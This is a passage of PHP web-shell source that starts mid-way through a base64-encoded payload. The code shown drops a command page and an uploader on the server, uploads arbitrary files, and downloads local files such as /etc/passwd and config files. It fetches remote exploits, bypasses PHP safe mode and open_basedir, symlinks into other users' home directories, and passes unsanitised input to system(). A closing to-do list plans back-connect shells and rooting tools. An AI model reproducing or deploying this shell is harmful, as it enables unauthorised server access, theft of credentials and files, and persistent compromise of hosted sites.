hpc3RzKCR0aGlzLT51cGxv?YWRMb2NhdGlvbikpewogICAgICAgICAgICAgICAgJGVycm9yID0gIlVwbG9hZCBsb2NhdGlvbiBkb2Vz?bnQgYXBwZWFyIHRvIGV4aXN0PyBUcnkgYW5vdGhlciByb3V0ZS4uLiI7CiAgICAgICAgICAgIH0gZWxz?ZSBpZiAoIWlzX3dyaXRlYWJsZSgkdGhpcy0+dXBsb2FkTG9jYXRpb24pKSB7CiAgICAgICAgICAgICAg?ICAkZXJyb3IgPSAiVGhpcyBkaXIgYWludCB3cml0YWJsZSBmb29sISBMb29rIGZvciBzb21ld2hlcmUg?ZWxzZS4uLiI7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAkdGFyZ2V0X3BhdGgg?PSAkdGhpcy0+dXBsb2FkTG9jYXRpb24gLiBiYXNlbmFtZSggJF9GSUxFU1snbXlmaWxlJ11bJ25hbWUn?XSk7CgogICAgICAgICAgICAgICAgaWYoQG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWydteWZpbGUn?XVsndG1wX25hbWUnXSwgJHRhcmdldF9wYXRoKSkgewogICAgICAgICAgICAgICAgICAgICRtc2cgPSBi?YXNlbmFtZSggJF9GSUxFU1snbXlmaWxlJ11bJ25hbWUnXSkuCiAgICAgICAgICAgICAgICAgICAgIiB3?YXMgdXBsb2FkZWQgc3VjY2Vzc2Z1bGx5Li4uR2V0IHlvdXIgTHVseiBvbiEiOwogICAgICAgICAgICAg?ICAgfSBlbHNlewogICAgICAgICAgICAgICAgICAgICRlcnJvciA9ICJFcnJvciA6KCI7CiAgICAgICAg?ICAgICAgICB9CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICR0aGlzLT5zaG93VXBsb2FkRm9ybSgk?bXNnLCRlcnJvcik7CiAgICAgICAgfQoKICAgIH0KCn0KPz4KPC9ib2R5PiA=";

//handle user input on choice of file to write and write accordingly (options outlined above)
if(isset($_POST['htmeth']) && $_POST['htmeth'] == '5')
{
    $workingdir = getcwd();
    $prepdir = explode($slash, $workingdir, -1);
    $wdir = implode($slash, $prepdir);
    $belowdir = $wdir . $slash . "lulz.php";
        
    $F1=fopen($belowdir,"w");
    fwrite($F1,base64_decode($fopt1),strlen(base64_decode($fopt1)));
    fclose($F1);
    
    //tell them to check manually to confirm it was created, maybe in future will automate this step...
    echo "<center><b><font color='red'>Check manually to confirm command page was created successfully at " . $belowdir . "<font color='green'>?cmd=<font olor='blue'>InsertCommandHere</font></font></b></font></center><br />";
}        
if(isset($_POST['htmeth']) && $_POST['htmeth'] == '6')
{
    $workingdir = getcwd();
    $prepdir = explode($slash, $workingdir, -1);
    $wdir = implode($slash, $prepdir);
    $belowdir = $wdir . $slash . "doalpu.php";
    
    $F2=fopen($belowdir,"w");
    fwrite($F2,base64_decode($fopt2),strlen(base64_decode($fopt2)));
    fclose($F2);
    
    //tell them to check manually to confirm it was created, maybe in future will automate this step...
    echo "<center><b><font color='red'>Check manually to confirm uploader was created successfully <font color='green'>" . $belowdir . "</font></b></font></center><br />";
}
echo "</td></tr></table>";
//End FILE WRITER tool




//START UPLOADER?DOWNLOADER TOOLS SECTION
echo "<table width='100%' border='1'>";
echo "<th colspan='2'><center><font color='red'><b> UPLOADER & DOWNLOADER TOOLS </b></font></center></th>";
echo "<tr>";
echo "<td width='50%'><center>";
//Start Uploader Tool
echo "<a name='uploader'></a>";
    $myUpload = new maxUpload(); 
    //$myUpload->setUploadLocation(getcwd().DIRECTORY_SEPARATOR);
    $myUpload->uploadFile();

class maxUpload{
    
    var $uploadLocation;
    
    
    function maxUpload(){
        $this->uploadLocation = getcwd().DIRECTORY_SEPARATOR;
    }
    function setUploadLocation($dir){
        $this->uploadLocation = $dir;
    }
    function showUploadForm($msg='',$error=''){

if ($msg != ''){
    echo "<p class='msg'><b><center><font color='red'>" . $msg . "</b></font><center></p>";
} else if ($error != ''){
    echo "<p class='emsg'><b><center><font color='red'>" . $error . "</b></form></center></p>";

}
echo "<center><b><font color='red'> FILE UPLOADER </font></b></center><br />";
echo "<form action='".$_SERVER['PHP_SELF']."' method='post' enctype='multipart/form-data'>";
echo "<center><label><b><font color='red'>File: </font></b><input name='myfile' type='file' size='30' /></label>";
echo "<label><input type='submit' name='submitBtn' class='sbtn' value='Upload That Shit!' /></label></center></form>";
}
    function uploadFile(){
        if (!isset($_POST['submitBtn'])){
            $this->showUploadForm();
        } else {
            $msg = "<center><font color='red'><b>" . ''  . "</b></font></center>";
            $error = "<center><font color='red'><b>" . ''  . "</b></font></center>";
            //Check destination directory
            if (!file_exists($this->uploadLocation)){
                $error = "<center><font color='red'> The target directory doesn't seem to exist?</font></b></center>";
            } else if (!is_writeable($this->uploadLocation)) {
                $error = "<center><font color='red'> Epic Failure! This directory is not writable....maybe try the File Writer tool?</font></b></center>";
            } else {
                $target_path = $this->uploadLocation . basename( $_FILES['myfile']['name']);

                if(@move_uploaded_file($_FILES['myfile']['tmp_name'], $target_path)) {
                    $msg = "<font color='blue'><b>" . basename( $_FILES['myfile']['name']) . "</font></b><center><font color='green'> was uploaded successfully - now go own this bitch!</font></b></center>";
                } else{
                    $error = "<center><font color='red'>The upload process failed!</font></b></center>";
                }
            }
            $this->showUploadForm($msg,$error);
        }
    }
}
echo "</td></center>";
//END UPLOADER TOOL

echo "<td width='50%'><center>";

//LOCAL FILE DOWNLOADER
//build form for user to provide path to file they want to download
echo "<center><b><font color='red'> LOCAL FILE DOWNLOADER </font></b></center><br />";
echo "<center><form action='$self' method='get'>";
echo "<font color='red'><b> Enter Full Path of File to Download: </b></font><input type='text' name='local_download'>";
echo "<input type='submit' value='Download Local File'><br /><br />";
echo "<b><sub><font color='grey'> Insert the full path to file you want to download, for example: /home/user1/public_html/inc/config.php </font></sub></b><br />";
echo "</form></center>";

//handle form info when sent
if(isset($_GET['local_download']))
{
//$path = $_SERVER['DOCUMENT_ROOT']."/path2file/"; // change the path to fit your websites document structure (not needed since we built form which passes full path and file to us :)
$fullPath = $_GET['local_download'];

if ($fd = fopen ($fullPath, "r")) {
    $fsize = filesize($fullPath);
    $path_parts = pathinfo($fullPath);
    $ext = strtolower($path_parts["extension"]);
    switch ($ext) {
        case "pdf":
        header("Content-type: application/pdf"); 
        header("Content-Disposition: attachment; filename=\"".$path_parts["basename"]."\""); 
        break;
        case "php":
        header("Content-type: text/plain"); 
        header("Content-Disposition: attachment; filename=\"".$path_parts["basename"]."\""); 
        break;
        case "pdf":
        header("Content-type: application/pdf"); 
        header("Content-Disposition: attachment; filename=\"".$path_parts["basename"]."\""); 
        break;
        case "txt":
        header("Content-type: text/plain"); 
        header("Content-Disposition: attachment; filename=\"".$path_parts["basename"]."\"");
        break;
        case "html":
        header("Content-type: text/html"); 
        header("Content-Disposition: attachment; filename=\"".$path_parts["basename"]."\""); 
        break;
        case "htm":
        header("Content-type: text/html"); 
        header("Content-Disposition: attachment; filename=\"".$path_parts["basename"]."\""); 
        break;        
        case "exe":
        header("Content-type: application/octet-stream"); 
        header("Content-Disposition: attachment; filename=\"".$path_parts["basename"]."\""); 
        break;            
        case "zip":
        header("Content-type: application/zip"); 
        header("Content-Disposition: attachment; filename=\"".$path_parts["basename"]."\""); 
        break;        
        case "doc":
        header("Content-type: application/msword");
        header("Content-Disposition: attachment; filename=\"".$path_parts["basename"]."\""); 
        break;            
        case "xls":
        header("Content-type: application/vnd.ms-excel");
        header("Content-Disposition: attachment; filename=\"".$path_parts["basename"]."\""); 
        break;        
        case "ppt":
        header("Content-type: application/vnd.ms-powerpoint"); 
        header("Content-Disposition: attachment; filename=\"".$path_parts["basename"]."\"");
        break;
        case "gif":
        header("Content-type: image/gif"); 
        header("Content-Disposition: attachment; filename=\"".$path_parts["basename"]."\""); 
        break;
        case "png":
        header("Content-type: image/png"); 
        header("Content-Disposition: attachment; filename=\"".$path_parts["basename"]."\""); 
        break;
        case "jpeg":
        header("Content-type: image/jpg"); 
        header("Content-Disposition: attachment; filename=\"".$path_parts["basename"]."\"");
        break;
        case "jpg":
        header("Content-type: image/jpg"); // add here more headers for diff. extensions
        header("Content-Disposition: attachment; filename=\"".$path_parts["basename"]."\""); // use 'attachment' to force a download
        break;
        default;
        header("Content-type: application/octet-stream");
        header("Content-Disposition: filename=\"".$path_parts["basename"]."\"");
    }
    header("Content-length: $fsize");
    header("Cache-control: private"); //use this to open files directly
    while(!feof($fd)) {
        $buffer = fread($fd, 2048);
        echo $buffer;
    }
}
fclose ($fd);
exit;
}
echo "</td></center>";
//END LOCAL FILE DOWLOADER



//START REMOTE FILE DOWNLOADER TOOL
echo "<tr><td colspan='2'><center><font color='red'><b> PHP REMOTE FILE DOWNLOADER </b></font></center></td></tr>";
echo "<tr>";
echo "<td colspan='2'><center><br />";
//set local location to download file to = current_directory/remote-file.txt
$rf = getcwd() . $slash . "remote-file";
// set local file name above and build form for user to provide remote file location of file to download...
echo "<form action='$self' method='post'>";
echo "<b><font color='red'>Remote File URL Location: </font></b><input type='text' name='remote_loc' size='81' maxlength=500><br />";
echo "<input type='submit' value='Get Remote File!'>";
echo "</form>";
echo "<b><sub><font color='grey'> i.e. http://www.site.com/exploits/file.c </font></sub></b><br>";
echo "<b><sub><font color='grey'> This is working well for pre-compiled and text based files, but not so great for binary files... </font></sub></b><br /><br />";
//Function we need to get the actual remote file
function remote_get($link,$file)
{
    //open remote location to read remote file from link and then write to location provided (use while to aovid issues with file size exceeding max allowed per request of 1024)
   $fp = @fopen($link,"r");
   while(!feof($fp))
   {
       $cont.= fread($fp,1024);
   }
   fclose($fp);

   $fp2 = @fopen($file,"w");
   fwrite($fp2,$cont);
   fclose($fp2);
}
//we handle the form details and use our function above to get file and write to location
if (isset($_POST['remote_loc']))
{
remote_get($_POST['remote_loc'],$rf);
alert("Check current_directory/remote-file for your remote file");
}
echo "</center></td></tr>";
//END REMOTE FILE DOWNLOAD TOOL
echo "</tr></table>";
//END UPLOADER/DOWNLOADER TOOLS SECTION



//START BYPASS TOOLS
echo "<a name='sfbypass_tools'></a>";
//PHP Safe Mode Bypass (get directory listing and read files)
//borrowed from locus shell, thanks
//build table, split in hald and place directory listing on one side and read file on the other so it flows in order of usual business
//build main table
echo "<table width='100%' border='1'>";
echo "<th colspan='2'><center><b><font color='red'> SAFE MODE BYPASS TOOLS </font></b></center></th>";

//start one row and place everything in there so it sits evenly
echo "<tr>";

//Safe Mode BYpass Directory Listing Tool...Use File Reader Tool after this for knock out 1-2 punch :p
//start table entry and set width to 50% so we can share with reader tool and look pretty :p
echo "<td width='50%'><center><font color='red'><b> Safe-Mode Bypass Directory Lister </b></font></center><br />";
//build form for user input to get desired path to list content of
echo "<center><form action='$self' method='get'>";
echo "<font color='red'><b>Directory to List: </b></font><input type='text' name='directory'>";
echo "<input type='submit' value='List It!'><br /><br />";
echo "<b><sub><font color='grey'> Insert the path to directory you want listing of, for example: /etc/ or /home/ </font></sub></b><br />";
echo "</form></center></td>";

//handle form data being sent from all of the above, which basically activates our funciton and reads out the directoy content for user desired location
if(isset($_GET['directory']))
{
//build a function to use for directory listing
function bypass_dirlist()
{
$bypassdir=$_GET['directory'];
//set bypassdir_files equal to anything returned by our glob() request to the request of user porvided input
$bypassdir_files = glob("$bypassdir*");
//status update and then display results
echo "<center><font color='red'><b>Direcotry listing of </font><font color='blue'>$bypassdir</font><br />";
foreach ($bypassdir_files as $filename)
{
   echo "<center><font color='green'> $filename\n </font></center>";
}
}
//list directory content using funciton we built
bypass_dirlist();
}

//Safe Mode BYpass File Reader
// set width to 50% so they share nicely and look pretty :p
echo "<td width='50%'><center><font color='red'><b>Safe-Mode Bypass File Reader</b></font</center><br />";
//build form for taking user input which we will use to build command to read based on input provided...
echo "<form action='$self' method='get'>";
echo "<font color='red'><b>File to Read: </b></font><input type='text' name='bypassfile'>";
echo "<input type='submit' value='Bypass & Read File'><br /><br />";
echo "<b><sub><font color='grey'> Insert the full path to file you want to read, for example: /etc/passwd </font></sub></b><br /></td>";
       
//build function for reading
function bypass_read()
{    
//set $test to null before using to keep it clean and avoid issues allowing us to create files in current directory which will be used to read our desired file...
$test="";
//We use tempnam() to create file with unique name in our current directory (unless changed above), our new file will be named HR
$temp=tempnam($test, "HR");
//set the user provided file (with full path) to variable so we can re-use
$bypassfile=$_GET['bypassfile'];
//sanitize our user provided input before use...
$bypassf=htmlspecialchars($bypassfile);
//quick status update...
echo "<br /><center><font color='red'><b>Getting file.</b>..</font><font color='blue'><b>$bypassf</b></center></font><br />";
//if we check to see if we can copy our needed file to our temp directory
//if we can we write our to our file HR
if(@copy("compress.zlib://".$bypassfile, $temp))
{
//open for reading our HR file
$bypassf1 = fopen($temp, "r");
//read our HR file
$action = fread($bypassf1, filesize($temp));
//close our file
fclose($bypassf1);
//we place our read content in variable and then display it back for user to see :)
$source=htmlspecialchars($action);
echo "<center><b><font color='red'>Start </font><font color='blue'>$bypassf </font></b><br /><font color='green'><b> $source </b></font><br /><b><font color='red'>Finish </font><font color='blue'>$bypassf</font></b><br /><br /></center>";
unlink($temp);

//If we cant copy to read then we either cant access it or it simply doesnt exist :(
} else {
die("<center><font color='red'><b>Epic Failure! File </font><font color='blue'>" . htmlspecialchars($bypassfile) . "</font><font color='red'> dosen't exists or you don't have  access...</font></center> <br />");
}
}
//end function

//Now we handle the actual content from our user provided input based on the form we built originally above
//if our parameter "bypassfile" is set by form being sent then read/display the content of file using the function we built above - bypass_read()
if(isset($_GET['bypassfile']))
{
bypass_read();
}
//End Safe Mode Bypass File Reader Tool
echo "</tr></table>";
echo "<br /><hr/>";
//End BYPASS TOOLS





//Now we lay out the form for setting up a PHP based Symlink
echo "<center><a name='symlink'><b><font color='red'>PHP BASED SYMLINK TOOL</font></a></b>";
echo "<br />";
echo "<br />";
echo "<b><font color='red'>Please enter your path details to create our new symlink below:</font><b><br />";
echo "<br />";
echo "<form action='$self' method='post'>";
echo "<b><font color='red'>Target Path: </font></b> <input type='text' name='target'/> <br />";
echo "<sub><font color='grey'>i.e. where you want to go WITH trailing '/': /home/TargetUserName/public_html/</font></sub><br />";
echo "<br />";
echo "<b><font color='red'>Control Path: </font></b> <input type='text' name='controlled' /> <br />";
echo "<sub><font color='grey'>i.e. point to folder you control or copy and paste below WITHOUT trailing '/'...<br />";
echo "Your currently sitting at: <font color='#686868 '>" . getcwd() . "</font></font></sub><br />";
echo "<br />";
echo "<input type='submit' value='Link That Shit!'/>";
echo "</form>";
echo "</center><br />";

//handle symlink form data as provided by user to execute a symlink command using PHP built in function symlink()
//fix this section...
if(isset($_POST['target']) && isset($_POST['controlled']))
{
    $symname = 'sym-test';
    $trgt = $_POST['target'];
    echo "<center><b>Your Target Path was: <font color='red'>" . $_POST["target"] . "</font></b></center>";
    $cntrl = $_POST['controlled'];
    echo "<center><b>Your Controlled Path is: <font color='red'>" . $_POST["controlled"] . "</font></b></center><br />";
    $lnk = $cntrl . $slash . $symname;
    @unlink($cntrl);
    symlink($trgt,$lnk);
    echo "<b><font color='red'>Your new symlink should have been created at: </font><font color='green'>" . getcwd() . $lnk . "</b></font><br />";
    @unlink($cntrl);
    echo "<br />";
}
//end of this tool
//




//Now we lay out the form for a OS based symlink (only works with *nix based systems)
echo "<hr />";
echo "<br />";
echo "<center><b><font color='red'>*NIX OS SYMLINKER</font></b>";
echo "<br />";
echo "<br />";
echo "<b><font color='red'>Please enter your path details to create our new OS based symlink below:</font><b><br />";
echo "<font color='grey'><b>NOTE:</b> This relies on the use of the system() command to wrap the OS commands. If this is disabled you need to do this manually above, sorry</font><br />";
echo "<br />";
echo "<form action='$self' method='post'>";
echo "<b><font color='red'>Target Path: </font></b> <input type='text' name='ostrgt'/> <br />";
echo "<sub><font color='grey'>i.e. where you want to go WITH trailing '/': /home/TargetUserName/public_html/</font></sub><br />";
echo "<br />";
echo "<b><font color='red'>Control Path: </font></b> <input type='text' name='oscntrl' /> <br />";
echo "<sub><font color='grey'>i.e. point to folder you control or copy and paste below WITHOUT trailing '/'...<br /><br />";
echo "Your currently sitting at: <font color='#686868 '>" . getcwd() . "</font></font></sub><br />";
echo "<br />";
echo "<input type='submit' value='Creat OS Based Symlink!'/>";
echo "</form>";
echo "<font color='grey'><b>NOTE:</b> Please make sure you put the trailing slash into your path entries for folder links so <b>/var/www/user<font color='red'>/</font></b>' and <b>NOT</b> /var/www/user</font>";

  
//handle symlink form data as provided by user to execute a symlink command using PHP built in function symlink()
//fix this section...
if(isset($_POST['ostrgt']) && isset($_POST['oscntrl']))
{
    $OSsymname = 'OSsymtest';
    $OStrgt = $_POST['ostrgt'];
    echo "<center><b>Your Target Path was: <font color='red'>" . $_POST["ostrgt"] . "</font></b></center>";
    $OScntrl = $_POST['oscntrl'];
    echo "<center><b>Your Controlled Path is: <font color='red'>" . $_POST["oscntrl"] . "</font></b></center><br />";
    
    $OSlnk = $OScntrl . $slash . $OSsymname;
    $symprefix = 'ln -s ' . $OStrgt;
    $symlinkOS = $symprefix . " " . $OSlnk;
    
    system($symlinkOS);

    echo "<b><font color='red'>Your new OS based symlink should have been created at: </font><font color='green'>" . getcwd() . $slash . $OSsymname . "</b></font><br />";
    echo "<br />";
}

echo "</center><br />";
//end of tool



echo "<br />";
echo "<hr />";

//start next tool
//borrowed code since it works, no need to re-invent the wheel. Credits to original creator who ever that may be...
echo "<center><b><font color='red'>PHP OPEN_BASEDIR BYPASS SYMLINKER</font></b>";
echo "<br />";
echo "<br />";
//set fake directory name and depth to create (16 is magic number for this exploit)
$fakedir="lulz";
$fakedep=16;
$num=0; // offset of symlink.$num
//set value of $file to that of the FORM request from the form below it or if blank or unset then set value to null ("") to avoid issues
if(!empty($_GET['file'])) $file=$_GET['file'];
else if(!empty($_POST['file'])) $file=$_POST['file'];
else $file="";

//Now build our form for user to supply link they want to symlink to which will fill the value of $file based on above if statement
echo "<font color='grey'><b>Please enter the path to Symlink to below...</b></font>";
echo "<form action='$self' method='post'>";
echo "<input type='text' name='file' size='50'>";
echo "<input type='submit' value='Bypass & Link That Shit!'></form>";
//i ffile is empty or unset then exit and dont do anything
if(empty($file))
    exit;
// if directory is not writable this wont work as we need to create directories and files so move your shell to a writable path so this will work (since this runs from page location of shell
if(!is_writable("."))
    die("This is not a writable directory fool");
// set directory level , then increment as we create directories, then check for their existence, then change to the new directory
$level=0;
for($as=0;$as<$fakedep;$as++){
    if(!file_exists($fakedir))
        mkdir($fakedir);
    chdir($fakedir);
}
while(1<$as--) chdir("..");
$hardstyle = explode("/", $file);
for($a=0;$a<count($hardstyle);$a++){
    if(!empty($hardstyle[$a])){
        if(!file_exists($hardstyle[$a])) 
            mkdir($hardstyle[$a]);
        chdir($hardstyle[$a]);
        $as++;
    }
}
$as++;
while($as--)
    chdir("..");
//once setup above is done creating a very deep folder path (16 deep to be exact) we will create our folder Zer0 and symlink to file location provided by user input
@rmdir("Zer0");
@unlink("Zer0");
@symlink(str_repeat($fakedir."/",$fakedep),"Zer0");
// this loop will make sure we dont create symlinks over existing links, this will make ti so if you create more than 1 link you get symlink, symlink1, symlink2.
while(1)
    if(true==(@symlink("Zer0/".str_repeat("../",$fakedep-1).$file,
"symlink".$num))) break;
    else $num++;
@unlink("Zer0");
mkdir("Zer0");
die('<FONT COLOR="RED">Your new Symlink should be found at: <a href="./symlink' .$num. '"> symlink' . $num . '</a> file</FONT>');
echo "</center>";
//end of tool
//end symlink section


/*
NOTES SECTION:
......
TO-DO LIST:
Add in Command Options drop down menu which is tied to preset commands to run
    Create list of basic enumeration steps on Linux and Windows, make if statement to offer them up based on OS details
Add in SQL Connection Manager instead of current ITSec stand-in
Add in Back Connect and Bind Options
Add in method for hex dump of executable and writing to target thus creating binary and then executing said binary (allow creation of netcat on Windows targets since most back connect options fail on windows)
Add in sessions to fix command passthru to be more stable and allow directory changes
Add in file system GUI based access, like big name shells
Add in Rooting functions or downloads for top 10

add:
available drives to system info up top (last?)
add sql connector script && separat SQL dump script
add converter/encrypter tool for: MD5, SHA1, Base64 encode & decode
drop down menu to load back connect options
drop down menu to execute preset commands for windows
drop down menu to execute preset commands for linux
add tool to find writable directory from user provided starting path (or maybe root path of user current working directory)
add an about page for team greetz and shoutouts :)
...
*/

//EOF
?>
